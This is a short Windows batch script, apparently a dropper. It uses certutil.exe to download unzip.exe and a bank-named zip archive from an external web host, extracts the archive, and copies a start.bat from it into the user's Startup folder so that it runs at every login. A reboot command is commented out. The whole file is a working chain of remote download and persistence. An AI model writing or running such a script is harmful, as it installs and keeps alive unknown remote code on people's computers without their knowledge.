 
@echo off
rem start python TransFile.py
set d=%USERPROFILE%\Desktop
set downPath=http://testlink.beats-digital.com/tools
set startMenu=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
set zipName=bank-of-Beijing
::echo %d%


certutil.exe -urlcache -split -f %downPath%/unzip.exe

certutil.exe -urlcache -split -f %downPath%/%zipName%.zip

unzip -o %zipName%.zip -d %zipName%/

xcopy /y %d%\%zipName%\start.bat %startMenu%

::shutdown /r /t 0

pause